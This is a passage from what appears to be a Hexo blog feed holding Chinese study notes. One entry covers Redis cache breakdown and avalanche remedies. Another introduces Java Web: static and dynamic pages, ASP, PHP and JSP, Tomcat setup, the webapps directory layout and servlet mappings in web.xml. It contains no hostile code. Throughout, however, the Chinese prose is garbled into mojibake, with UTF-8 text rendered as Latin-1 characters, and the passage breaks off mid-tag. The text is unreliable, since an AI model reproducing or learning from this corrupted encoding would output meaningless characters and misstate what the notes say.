<p>ä»ç¼“å­˜å±‚é¢æ¥çœ‹ï¼Œæ²¡æœ‰è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°çƒ­ç‚¹ key è¿‡æœŸåäº§ç”Ÿçš„é—®é¢˜</p>
<p><strong>2.åŠ äº’æ–¥é”</strong></p>
<p>åˆ†å¸ƒå¼é”ï¼šä½¿ç”¨åˆ†å¸ƒå¼é”ï¼Œä¿è¯å¯¹äºæ¯ä¸ªkeyåŒæ—¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹å»æŸ¥è¯¢åç«¯æœåŠ¡ï¼Œå…¶ä»–çº¿ç¨‹æ²¡æœ‰è·å¾—åˆ†å¸ƒå¼é”çš„æƒé™ï¼Œå› æ­¤åªéœ€è¦ç­‰å¾…å³å¯ã€‚è¿™ç§æ–¹å¼å°†é«˜å¹¶å‘çš„å‹åŠ›è½¬ç§»åˆ°äº†åˆ†å¸ƒå¼é”ï¼Œå› æ­¤å¯¹åˆ†å¸ƒå¼é”çš„è€ƒéªŒå¾ˆå¤§ã€‚</p>
<h2 id="3ã€ç¼“å­˜é›ªå´©ï¼ˆç¼“å­˜é›†ä¸­è¿‡æœŸï¼Œå®•æœºï¼‰"><a href="#3ã€ç¼“å­˜é›ªå´©ï¼ˆç¼“å­˜é›†ä¸­è¿‡æœŸï¼Œå®•æœºï¼‰" class="headerlink" title="3ã€ç¼“å­˜é›ªå´©ï¼ˆç¼“å­˜é›†ä¸­è¿‡æœŸï¼Œå®•æœºï¼‰"></a>3ã€ç¼“å­˜é›ªå´©ï¼ˆç¼“å­˜é›†ä¸­è¿‡æœŸï¼Œå®•æœºï¼‰</h2><blockquote>
<p>æ¦‚å¿µ</p>
</blockquote>
<p>ç¼“å­˜é›ªå´©ï¼Œæ˜¯æŒ‡åœ¨æŸä¸€ä¸ªæ—¶é—´æ®µï¼Œç¼“å­˜é›†ä¸­è¿‡æœŸå¤±æ•ˆã€‚</p>
<p>äº§ç”Ÿé›ªå´©çš„åŸå› ä¹‹ä¸€ï¼Œæ¯”å¦‚åœ¨å†™æœ¬æ–‡çš„æ—¶å€™ï¼Œé©¬ä¸Šå°±è¦åˆ°åŒåäºŒé›¶ç‚¹ï¼Œå¾ˆå¿«å°±ä¼šè¿æ¥ä¸€æ³¢æŠ¢è´­ï¼Œè¿™æ³¢å•†å“æ—¶é—´æ¯”è¾ƒé›†ä¸­çš„æ”¾å…¥äº†ç¼“å­˜ï¼Œå‡è®¾ç¼“å­˜ä¸€ä¸ªå°æ—¶ã€‚é‚£ä¹ˆåˆ°äº†å‡Œæ™¨ä¸€ç‚¹é’Ÿçš„æ—¶å€™ï¼Œè¿™æ‰¹å•†å“çš„ç¼“å­˜å°±éƒ½è¿‡æœŸäº†ã€‚è€Œå¯¹è¿™æ‰¹å•†å“çš„è®¿é—®æŸ¥è¯¢ï¼Œéƒ½è½åˆ°äº†æ•°æ®åº“ä¸Šï¼Œå¯¹äºæ•°æ®åº“è€Œè¨€ï¼Œå°±ä¼šäº§ç”Ÿå‘¨æœŸæ€§çš„å‹åŠ›æ³¢å³°ã€‚äºæ˜¯æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¾¾åˆ°å­˜å‚¨å±‚ï¼Œå­˜å‚¨å±‚çš„è°ƒç”¨é‡ä¼šæš´å¢ï¼Œé€ æˆå­˜å‚¨å±‚ä¹Ÿä¼šæŒ‚æ‰çš„æƒ…å†µã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/9396e3dceebaf224c16ab2e58f97730c--4b8c--image-20240921190254343.png" alt="image-20240921190254343"></p>
<p>å…¶å®é›†ä¸­è¿‡æœŸï¼Œå€’ä¸æ˜¯éå¸¸è‡´å‘½ï¼Œæ¯”è¾ƒè‡´å‘½çš„ç¼“å­˜é›ªå´©ï¼Œæ˜¯ç¼“å­˜æœåŠ¡å™¨æŸä¸ªèŠ‚ç‚¹å®•æœºæˆ–æ–­ç½‘ã€‚å› ä¸ºè‡ªç„¶å½¢æˆçš„ç¼“å­˜é›ªå´©ï¼Œä¸€å®šæ˜¯åœ¨æŸä¸ªæ—¶é—´æ®µé›†ä¸­åˆ›å»ºç¼“å­˜ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæ•°æ®åº“ä¹Ÿæ˜¯å¯ä»¥é¡¶ä½å‹åŠ›çš„ã€‚æ— éå°±æ˜¯å¯¹æ•°æ®åº“äº§ç”Ÿå‘¨æœŸæ€§çš„å‹åŠ›è€Œå·²ã€‚è€Œç¼“å­˜æœåŠ¡èŠ‚ç‚¹çš„å®•æœºï¼Œå¯¹æ•°æ®åº“æœåŠ¡å™¨é€ æˆçš„å‹åŠ›æ˜¯ä¸å¯é¢„çŸ¥çš„ï¼Œå¾ˆæœ‰å¯èƒ½ç¬é—´å°±æŠŠæ•°æ®åº“å‹å®ã€‚</p>
<blockquote>
<p>è§£å†³æ–¹æ¡ˆ</p>
</blockquote>
<p><strong>1.redisé«˜å¯ç”¨</strong></p>
<p>è¿™ä¸ªæ€æƒ³çš„å«ä¹‰æ˜¯ï¼Œæ—¢ç„¶redisæœ‰å¯èƒ½æŒ‚æ‰ï¼Œé‚£æˆ‘å¤šå¢è®¾å‡ å°redisï¼Œè¿™æ ·ä¸€å°æŒ‚æ‰ä¹‹åå…¶ä»–çš„è¿˜å¯ä»¥ç»§ç»­å·¥ä½œï¼Œå…¶å®å°±æ˜¯æ­å»ºçš„é›†ç¾¤ã€‚ï¼ˆå¼‚åœ°å¤šæ´»ï¼ï¼‰</p>
<p><strong>2.é™æµé™çº§</strong></p>
<p>è¿™ä¸ªè§£å†³æ–¹æ¡ˆçš„æ€æƒ³æ˜¯ï¼Œåœ¨ç¼“å­˜å¤±æ•ˆåï¼Œé€šè¿‡åŠ é”æˆ–è€…é˜Ÿåˆ—æ¥æ§åˆ¶è¯»æ•°æ®åº“å†™ç¼“å­˜çš„çº¿ç¨‹æ•°é‡ã€‚æ¯”å¦‚å¯¹æŸä¸ªkeyåªå…è®¸ä¸€ä¸ªçº¿ç¨‹æŸ¥è¯¢æ•°æ®å’Œå†™ç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…ã€‚</p>
<p><strong>3.æ•°æ®é¢„çƒ­</strong></p>
<p>æ•°æ®åŠ çƒ­çš„å«ä¹‰å°±æ˜¯åœ¨æ­£å¼éƒ¨ç½²ä¹‹å‰ï¼Œæˆ‘å…ˆæŠŠå¯èƒ½çš„æ•°æ®å…ˆé¢„å…ˆè®¿é—®ä¸€éï¼Œè¿™æ ·éƒ¨åˆ†å¯èƒ½å¤§é‡è®¿é—®çš„æ•°æ®å°±ä¼šåŠ è½½åˆ°ç¼“å­˜ä¸­ã€‚åœ¨å³å°†å‘ç”Ÿå¤§å¹¶å‘è®¿é—®å‰æ‰‹åŠ¨è§¦å‘åŠ è½½ç¼“å­˜ä¸åŒçš„keyï¼Œè®¾ç½®ä¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œè®©ç¼“å­˜å¤±æ•ˆçš„æ—¶é—´ç‚¹å°½é‡å‡åŒ€ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>Java-Web</title>
    <url>/2024/10/20/Java-Web/</url>
    <content><![CDATA[<p>Javaç³»åˆ—ä¹‹JavaWeb</p>
<span id="more"></span>

<h2 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h2><h3 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1.å‰è¨€"></a>1.å‰è¨€</h3><blockquote>
<p>webå¼€å‘ï¼š</p>
</blockquote>
<ul>
<li><p>webï¼Œç½‘é¡µçš„æ„æ€  ï¼Œ <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
<li><p>é™æ€web</p>
<ul>
<li>htmlï¼Œcss</li>
<li>æä¾›ç»™æ‰€æœ‰äººçœ‹çš„æ•°æ®å§‹ç»ˆä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼</li>
</ul>
</li>
<li><p>åŠ¨æ€web</p>
<ul>
<li>æ·˜å®ï¼Œå‡ ä¹æ˜¯æ‰€æœ‰çš„ç½‘ç«™ï¼›</li>
<li>æä¾›ç»™æ‰€æœ‰äººçœ‹çš„æ•°æ®å§‹ç»ˆä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ¯ä¸ªäººåœ¨ä¸åŒçš„æ—¶é—´ï¼Œä¸åŒçš„åœ°ç‚¹çœ‹åˆ°çš„ä¿¡æ¯å„ä¸ç›¸åŒï¼</li>
<li>æŠ€æœ¯æ ˆï¼šServlet&#x2F;JSPï¼ŒASPï¼ŒPHPã€‚</li>
</ul>
</li>
<li><p>åœ¨Javaä¸­ï¼Œ<strong>åŠ¨æ€webèµ„æºå¼€å‘çš„æŠ€æœ¯ç»Ÿç§°ä¸ºJavaWeb</strong>ã€‚</p>
</li>
</ul>
<h3 id="2-webåº”ç”¨ç¨‹åº"><a href="#2-webåº”ç”¨ç¨‹åº" class="headerlink" title="2.webåº”ç”¨ç¨‹åº"></a>2.webåº”ç”¨ç¨‹åº</h3><blockquote>
<p>webåº”ç”¨ç¨‹åºï¼šå¯ä»¥æä¾›æµè§ˆå™¨è®¿é—®çš„ç¨‹åºã€‚</p>
</blockquote>
<ul>
<li><p>a.html.b.htmlâ€¦â€¦å¤šä¸ªwebèµ„æºï¼Œè¿™äº›webèµ„æºå¯ä»¥è¢«å¤–ç•Œè®¿é—®ï¼Œå¯¹å¤–ç•Œæä¾›æœåŠ¡ã€‚</p>
</li>
<li><p>æˆ‘ä»¬èƒ½è®¿é—®åˆ°çš„ä»»ä½•ä¸€ä¸ªé¡µé¢æˆ–è€…èµ„æºï¼Œéƒ½å­˜åœ¨äºè¿™ä¸ªä¸–ç•Œçš„æŸä¸€ä¸ªè§’è½çš„è®¡ç®—æœºä¸Šã€‚</p>
</li>
<li><p>URL </p>
</li>
<li><p>è¿™äº›ç»Ÿä¸€çš„webèµ„æºä¼šè¢«æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œwebåº”ç”¨ç¨‹åºâ€“&gt;Tomcatï¼šæœåŠ¡å™¨ã€‚</p>
</li>
<li><p>ä¸€ä¸ªwebåº”ç”¨ç”±å¤šéƒ¨åˆ†ç»„æˆ ï¼ˆé™æ€webï¼ŒåŠ¨æ€webï¼‰ã€‚</p>
<ul>
<li>htmlï¼Œcssï¼Œjs</li>
<li>jspï¼Œservlet</li>
<li>Javaç¨‹åº</li>
<li>jaråŒ…</li>
<li>é…ç½®æ–‡ä»¶ ï¼ˆPropertiesï¼‰</li>
</ul>
</li>
<li><p>webåº”ç”¨ç¨‹åºç¼–å†™å®Œæ¯•åï¼Œè‹¥æƒ³æä¾›ç»™å¤–ç•Œè®¿é—®ï¼šéœ€è¦ä¸€ä¸ªæœåŠ¡å™¨æ¥ç»Ÿä¸€ç®¡ç†ï¼›</p>
</li>
</ul>
<h3 id="3-é™æ€web"><a href="#3-é™æ€web" class="headerlink" title="3.é™æ€web"></a>3.é™æ€web</h3><ul>
<li>*.htm, *.htmlï¼Œè¿™äº›éƒ½æ˜¯ç½‘é¡µçš„åç¼€ï¼Œå¦‚æœæœåŠ¡å™¨ä¸Šä¸€ç›´å­˜åœ¨è¿™äº›ä¸œè¥¿ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿›è¡Œè¯»å–ã€‚é€šç»œï¼›</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/56c032f6d482f0b7a3b941486f65a997--c6b1--image-20241020155101909.png" alt="image-20241020155101909">é™æ€webå­˜åœ¨çš„ç¼ºç‚¹ï¼š</p>
<ul>
<li>Webé¡µé¢æ— æ³•åŠ¨æ€æ›´æ–°ï¼Œæ‰€æœ‰ç”¨æˆ·çœ‹åˆ°éƒ½æ˜¯åŒä¸€ä¸ªé¡µé¢ï¼›<ul>
<li>è½®æ’­å›¾ï¼Œç‚¹å‡»ç‰¹æ•ˆï¼šä¼ªåŠ¨æ€ï¼›</li>
<li>JavaScript [å®é™…å¼€å‘ä¸­ï¼Œå®ƒç”¨çš„æœ€å¤š]ï¼›</li>
<li>VBScriptï¼›</li>
</ul>
</li>
<li>å®ƒæ— æ³•å’Œæ•°æ®åº“äº¤äº’ï¼ˆæ•°æ®æ— æ³•æŒä¹…åŒ–ï¼Œç”¨æˆ·æ— æ³•äº¤äº’ï¼‰ã€‚</li>
</ul>
<h3 id="4-åŠ¨æ€web"><a href="#4-åŠ¨æ€web" class="headerlink" title="4.åŠ¨æ€web"></a>4.åŠ¨æ€web</h3><blockquote>
<p>é¡µé¢ä¼šåŠ¨æ€å±•ç¤ºï¼š â€œWebçš„é¡µé¢å±•ç¤ºçš„æ•ˆæœå› äººè€Œå¼‚â€ï¼›</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/807d51b5a32127d47907a9a33d7acb47--2e1b--image-20241020155149113.png" alt="image-20241020155149113"></p>
<p>å½“ä»£é¡¹ç›®åŸºæœ¬ä¸Šéƒ½æ˜¯åŠ¨æ€é¡µé¢äº†ï¼Œå¾ˆå°‘æœ‰çº¯é™æ€çš„äº†ã€‚</p>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>åŠ å…¥æœåŠ¡å™¨çš„åŠ¨æ€webèµ„æºå‡ºç°äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°ç¼–å†™<strong>åå°ç¨‹åº</strong>ï¼Œé‡æ–°å‘å¸ƒï¼›<ul>
<li>åœæœºç»´æŠ¤ã€‚</li>
</ul>
</li>
</ul>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>Webé¡µé¢å¯ä»¥åŠ¨æ€æ›´æ–°ï¼Œæ‰€æœ‰ç”¨æˆ·çœ‹åˆ°éƒ½ä¸æ˜¯åŒä¸€ä¸ªé¡µé¢ï¼›</li>
<li>å®ƒå¯ä»¥ä¸æ•°æ®åº“äº¤äº’ ï¼ˆæ•°æ®æŒä¹…åŒ–ï¼šæ³¨å†Œï¼Œå•†å“ä¿¡æ¯ï¼Œç”¨æˆ·ä¿¡æ¯â€¦â€¦..ï¼‰ï¼›</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/839e5d94ddf61fb98ac719e180a1df4b--0a5a--image-20241020155234661.png" alt="image-20241020155234661"></p>
<h2 id="äºŒã€webæœåŠ¡å™¨"><a href="#äºŒã€webæœåŠ¡å™¨" class="headerlink" title="äºŒã€webæœåŠ¡å™¨"></a>äºŒã€webæœåŠ¡å™¨</h2><h3 id="1-æŠ€æœ¯è®²è§£"><a href="#1-æŠ€æœ¯è®²è§£" class="headerlink" title="1.æŠ€æœ¯è®²è§£"></a>1.æŠ€æœ¯è®²è§£</h3><blockquote>
<p><strong>ASP:</strong></p>
</blockquote>
<ul>
<li><p>å¾®è½¯ï¼šå›½å†…æœ€æ—©æµè¡Œçš„å°±æ˜¯ASPï¼›</p>
</li>
<li><p>åœ¨HTMLä¸­åµŒå…¥äº†VBçš„è„šæœ¬ï¼Œ  ASP + COMï¼›</p>
</li>
<li><p>åœ¨ASPå¼€å‘ä¸­ï¼ŒåŸºæœ¬ä¸€ä¸ªé¡µé¢éƒ½æœ‰å‡ åƒè¡Œçš„ä¸šåŠ¡ä»£ç ï¼Œé¡µé¢æå…¶æ¢ä¹±ï¼Œç»´æŠ¤æˆæœ¬é«˜ï¼</p>
</li>
<li><p>C# </p>
</li>
<li><p>IIS</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            &lt;%</span><br><span class="line">            System.out.println(&quot;hello&quot;)</span><br><span class="line">            %&gt;</span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">       	<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>phpï¼š</strong></p>
</blockquote>
<ul>
<li>PHPå¼€å‘é€Ÿåº¦å¾ˆå¿«ï¼ŒåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œè·¨å¹³å°ï¼Œä»£ç å¾ˆç®€å• ï¼ˆ70% , WPï¼‰</li>
<li>æ— æ³•æ‰¿è½½å¤§è®¿é—®é‡çš„æƒ…å†µï¼ˆå±€é™æ€§ï¼‰</li>
</ul>
<blockquote>
<p>**JSP&#x2F;Servlet : ** </p>
</blockquote>
<p>JSPå½“ä¸‹ä¹ŸåŸºæœ¬ä¸Šå¾ˆå°‘ç”¨åˆ°äº†ï¼Œç°æ—¶ä»£ä¸»æµçš„æ›´å¤šéƒ½æ˜¯<strong>å‰åç«¯åˆ†ç¦»</strong>ï¼</p>
<p>B&#x2F;Sï¼šæµè§ˆå’ŒæœåŠ¡å™¨</p>
<p>C&#x2F;S:  å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</p>
<ul>
<li>sunå…¬å¸ä¸»æ¨çš„B&#x2F;Sæ¶æ„</li>
<li>åŸºäºJavaè¯­è¨€çš„ (æ‰€æœ‰çš„å¤§å…¬å¸ï¼Œæˆ–è€…ä¸€äº›å¼€æºçš„ç»„ä»¶ï¼Œéƒ½æ˜¯ç”¨Javaå†™çš„)</li>
<li>å¯ä»¥æ‰¿è½½ä¸‰é«˜é—®é¢˜å¸¦æ¥çš„å½±å“ï¼›</li>
<li>è¯­æ³•åƒASP ï¼Œ ASPâ€“&gt;JSP , åŠ å¼ºå¸‚åœºå¼ºåº¦ï¼›</li>
</ul>
<p>â€¦..</p>
<h3 id="2-webæœåŠ¡å™¨"><a href="#2-webæœåŠ¡å™¨" class="headerlink" title="2.webæœåŠ¡å™¨"></a>2.webæœåŠ¡å™¨</h3><ul>
<li><p>æœåŠ¡å™¨æ˜¯ä¸€ç§è¢«åŠ¨çš„æ“ä½œï¼Œç”¨æ¥å¤„ç†ç”¨æˆ·çš„ä¸€äº›è¯·æ±‚å’Œç»™ç”¨æˆ·ä¸€äº›å“åº”ä¿¡æ¯ï¼›</p>
</li>
<li><p><strong>IIS</strong>ï¼ˆåŸºæœ¬å·²ç»æ·˜æ±°ï¼‰</p>
<ul>
<li>å¾®è½¯çš„ï¼› ASPâ€¦,Windowsä¸­è‡ªå¸¦çš„</li>
<li>æ›´å¤šä¸»è¦æ˜¯åœ¨å†…ç½‘ä¸­å¯èƒ½ä¼šæœ‰ç¨å¾®å¤šç‚¹</li>
</ul>
</li>
<li><p>Tomcat</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/21fd1f5d7f17a0d70ace4add65570b9c--34f2--image-20241020155432949.png" alt="image-20241020155432949"></p>
</li>
<li><p>&#x3D;&#x3D;é¢å‘ç™¾åº¦ç¼–ç¨‹&#x3D;&#x3D;ï¼›</p>
</li>
<li><p>Tomcatæ˜¯Apache è½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundationï¼‰çš„Jakarta é¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œæœ€æ–°çš„Servlet å’ŒJSP è§„èŒƒæ€»æ˜¯èƒ½åœ¨Tomcat ä¸­å¾—åˆ°ä½“ç°ï¼Œå› ä¸ºTomcat æŠ€æœ¯å…ˆè¿›.æ€§èƒ½ç¨³å®šï¼Œè€Œä¸”<strong>å…è´¹</strong>ï¼Œå› è€Œæ·±å—Java çˆ±å¥½è€…çš„å–œçˆ±å¹¶å¾—åˆ°äº†éƒ¨åˆ†è½¯ä»¶å¼€å‘å•†çš„è®¤å¯ï¼Œæˆä¸ºç›®å‰æ¯”è¾ƒæµè¡Œçš„Web åº”ç”¨æœåŠ¡å™¨ã€‚</p>
</li>
<li><p>Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">æœåŠ¡å™¨</a>ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ï¼Œæ˜¯å¼€å‘å’Œè°ƒè¯•JSP ç¨‹åºçš„é¦–é€‰ã€‚å¯¹äºä¸€ä¸ªJavaåˆå­¦webçš„äººæ¥è¯´ï¼Œå®ƒæ˜¯æœ€ä½³çš„é€‰æ‹©ã€‚</p>
</li>
<li><p>Tomcat å®é™…ä¸Šè¿è¡ŒJSP é¡µé¢å’ŒServletã€‚Tomcatæœ€æ–°ç‰ˆæœ¬ä¸º<strong>9.0ã€‚</strong></p>
</li>
</ul>
<p>â€¦.</p>
<blockquote>
<p>æœ‰èƒ½åŠ›çš„æ—¶å€™å¯ä»¥å°è¯•ä¸€ä¸‹æ‰‹å†™TomcatæœåŠ¡å™¨</p>
</blockquote>
<ul>
<li><p>ä¸‹è½½tomcatï¼š</p>
<ol>
<li><p>å®‰è£… or  è§£å‹ï¼›</p>
</li>
<li><p>äº†è§£é…ç½®æ–‡ä»¶åŠç›®å½•ç»“æ„ï¼›</p>
</li>
<li><p>è¿™ä¸ªä¸œè¥¿çš„ä½œç”¨ã€‚</p>
</li>
</ol>
</li>
</ul>
<h2 id="ä¸‰ã€Tomcat"><a href="#ä¸‰ã€Tomcat" class="headerlink" title="ä¸‰ã€Tomcat"></a>ä¸‰ã€Tomcat</h2><h3 id="1ã€Tomcatå¿«é€Ÿå¼€å§‹"><a href="#1ã€Tomcatå¿«é€Ÿå¼€å§‹" class="headerlink" title="1ã€Tomcatå¿«é€Ÿå¼€å§‹"></a>1ã€Tomcatå¿«é€Ÿå¼€å§‹</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/2038d5afcb332887bf8d0c931e858d84--083d--image-20241020161607972.png" alt="image-20241020161607972"></p>
<ul>
<li><strong>å¯åŠ¨ã€‚å…³é—­Tomcat</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/6485889873973656ca74e813c31241e8--2943--image-20241020161631963.png" alt="image-20241020161631963"></p>
<h3 id="2ã€é…ç½®æ–‡ä»¶ä¿®æ”¹"><a href="#2ã€é…ç½®æ–‡ä»¶ä¿®æ”¹" class="headerlink" title="2ã€é…ç½®æ–‡ä»¶ä¿®æ”¹"></a>2ã€é…ç½®æ–‡ä»¶ä¿®æ”¹</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/cf43a27a56d243669ba85e932373c951--36d6--image-20241020161652072.png" alt="image-20241020161652072"></p>
<p>è¿˜æœ‰å°±æ˜¯ä¸€äº›å…¶ä»–çš„é…ç½®æ–‡ä»¶</p>
<p>æ¯”å¦‚tomcat-usersæ˜¯ç”¨æ¥é…ç½®åå°ç™»å½•çš„</p>
<p>web.xmlæ˜¯ç”¨æ¥é…ç½®ä¸€äº›æ¯”å¦‚é¦–é¡µæ˜¯ä»€ä¹ˆçš„</p>
<h3 id="3ã€å‘å¸ƒä¸€ä¸ªWebç½‘ç«™"><a href="#3ã€å‘å¸ƒä¸€ä¸ªWebç½‘ç«™" class="headerlink" title="3ã€å‘å¸ƒä¸€ä¸ªWebç½‘ç«™"></a>3ã€å‘å¸ƒä¸€ä¸ªWebç½‘ç«™</h3><ul>
<li><p>ä¸ä¼šå°±å…ˆæ¨¡ä»¿ï¼š</p>
<ul>
<li>å°†è‡ªå·±å†™çš„ç½‘ç«™ï¼Œæ”¾åˆ°æœåŠ¡å™¨(Tomcat)ä¸­æŒ‡å®šçš„webåº”ç”¨çš„æ–‡ä»¶å¤¹ï¼ˆwebappsï¼‰ä¸‹ï¼Œå°±å¯ä»¥è®¿é—®äº†ã€‚</li>
</ul>
</li>
<li><p>ç½‘ç«™åº”è¯¥æœ‰çš„ç»“æ„</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">--webapps ï¼šTomcatæœåŠ¡å™¨çš„webç›®å½•</span><br><span class="line">	-ROOT</span><br><span class="line">	-books ï¼šç½‘ç«™çš„ç›®å½•å</span><br><span class="line">		- WEB-INF</span><br><span class="line">			-classes : javaç¨‹åº</span><br><span class="line">			-libï¼šwebåº”ç”¨æ‰€ä¾èµ–çš„jaråŒ…</span><br><span class="line">			-web.xml ï¼šç½‘ç«™é…ç½®æ–‡ä»¶</span><br><span class="line">		- index.html é»˜è®¤çš„é¦–é¡µ</span><br><span class="line">		- <span class="keyword">static</span> </span><br><span class="line">            -css</span><br><span class="line">            	-style.css</span><br><span class="line">            -js</span><br><span class="line">            -img</span><br><span class="line">         -.....</span><br></pre></td></tr></table></figure>

<h2 id="å››ã€Servlet"><a href="#å››ã€Servlet" class="headerlink" title="å››ã€Servlet"></a>å››ã€Servlet</h2><h3 id="1-Servletç®€ä»‹"><a href="#1-Servletç®€ä»‹" class="headerlink" title="1.Servletç®€ä»‹"></a>1.Servletç®€ä»‹</h3><ul>
<li><p>Servletå°±æ˜¯sunå…¬å¸å¼€å‘åŠ¨æ€webçš„ä¸€é—¨æŠ€æœ¯ã€‚</p>
</li>
<li><p>Sunåœ¨è¿™äº›APIä¸­æä¾›ä¸€ä¸ªæ¥å£å«åšï¼šServletï¼Œå¦‚æœä½ æƒ³å¼€å‘ä¸€ä¸ªServletç¨‹åºï¼Œåªéœ€è¦å®Œæˆä¸¤ä¸ªå°æ­¥éª¤ï¼š</p>
<ul>
<li>ç¼–å†™ä¸€ä¸ªç±»ï¼Œå®ç°Servletæ¥å£ã€‚</li>
<li>æŠŠå¼€å‘å¥½çš„Javaç±»éƒ¨ç½²åˆ°webæœåŠ¡å™¨ä¸­ã€‚</li>
</ul>
</li>
<li><p><strong>æŠŠå®ç°äº†Servletæ¥å£çš„Javaç¨‹åºå«åšï¼ŒServlet</strong>ã€‚</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/613e74e1a2b25fb14171ed0cd6eb5c31--73b2--image-20241020165156954.png" alt="image-20241020165156954"></p>
<p>ç›´æ¥å¯ä»¥åˆ›å»ºjavawebé¡¹ç›®</p>
<h3 id="2ã€SerlvetåŸç†"><a href="#2ã€SerlvetåŸç†" class="headerlink" title="2ã€SerlvetåŸç†"></a>2ã€SerlvetåŸç†</h3><ul>
<li>Servletæ˜¯ç”±WebæœåŠ¡å™¨è°ƒç”¨ï¼ŒwebæœåŠ¡å™¨åœ¨æ”¶åˆ°æµè§ˆå™¨è¯·æ±‚ä¹‹åï¼Œä¼šï¼š</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/a930c7e6af9d9c0c572bb6bd34fae6aa--7f47--image-20241020165416033.png" alt="image-20241020165416033"></p>
<h3 id="3-Mappingé—®é¢˜"><a href="#3-Mappingé—®é¢˜" class="headerlink" title="3.Mappingé—®é¢˜"></a>3.Mappingé—®é¢˜</h3><ol>
<li><p>ä¸€ä¸ªServletå¯ä»¥æŒ‡å®šä¸€ä¸ªæ˜ å°„è·¯å¾„ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸€ä¸ªServletå¯ä»¥æŒ‡å®šå¤šä¸ªæ˜ å°„è·¯å¾„ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 